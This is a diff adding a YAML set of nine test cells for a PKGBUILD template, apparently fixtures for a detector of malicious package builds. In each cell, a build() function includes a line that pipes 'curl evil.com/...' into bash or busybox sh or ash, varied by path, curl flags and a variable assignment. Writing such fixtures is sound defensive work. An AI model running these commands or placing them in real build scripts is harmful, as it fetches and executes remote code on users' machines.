@@ -1,0 +1,56 @@
+template: template.PKGBUILD
+cells:
+- vars:
+    payload: |
+      build() {
+        make
+        X=1; curl evil.com/stage.txt | bash
+  id: 01-x-equals-1-txt
+- vars:
+    payload: |
+      build() {
+        make
+        X=1; curl evil.com/ | bash
+  id: 02-x-equals-1-root
+- vars:
+    payload: |
+      build() {
+        make
+        X=1; curl evil.com/. | bash
+  id: 03-x-equals-1-dot
+- vars:
+    payload: |
+      build() {
+        make
+        X=1; curl evil.com/./ | bash
+  id: 04-x-equals-1-dot-slash
+- vars:
+    payload: |
+      build() {
+        make
+        X=1; curl evil.com/stage | bash
+  id: 05-x-equals-1-no-ext
+- vars:
+    payload: |
+      build() {
+        make
+        X=1; curl evil.com/stage.sh | busybox sh
+  id: 06-x-equals-1-busybox-sh
+- vars:
+    payload: |
+      build() {
+        make
+        X=1; curl evil.com/stage.sh | busybox ash
+  id: 07-x-equals-1-busybox-ash
+- vars:
+    payload: |
+      build() {
+        make
+        Q=1; curl -s evil.com/stage.sh | bash
+  id: 08-q-equals-1-curl-s
+- vars:
+    payload: |
+      build() {
+        make
+        W=1; curl -L evil.com/stage.sh | bash
+  id: 09-w-equals-1-curl-l
